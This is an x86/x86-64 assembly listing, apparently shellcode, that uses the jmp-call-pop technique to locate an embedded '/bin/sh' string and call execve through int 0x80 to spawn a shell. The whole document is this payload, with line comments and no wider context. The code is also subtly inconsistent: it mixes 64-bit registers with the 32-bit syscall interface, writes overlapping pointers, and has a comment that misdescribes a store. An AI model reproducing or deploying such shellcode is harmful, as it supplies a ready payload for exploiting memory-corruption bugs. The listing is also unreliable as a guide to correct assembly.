jmp short start            ; jump to the start of processing.

get_ptr:
    pop    rbx             ; Pop address of string to rbx
    xor    rax, rax        ; null out rax
    mov    [rbx + 7], al   ; null terminate sh path
    mov [rbx + 8], rbx     ; place the address at the A
    mov [rbx + 12], rbx    ; put the null terminator in the correct place.
    lea rcx, [rbx+8]       ; load the address we made into rcx
                           ; this is the argv pointer
    lea rdx, [ebx + 16]    ; lead envp pointer
                           ; see man 2 execve for details
    mov rax, 11            ; ready for syscall 11
    int 0X80               ; Execute syscall.

start:
    call get_ptr           ; call addressing function
    db '/bin/sh'           ; file to be executed by syscall.
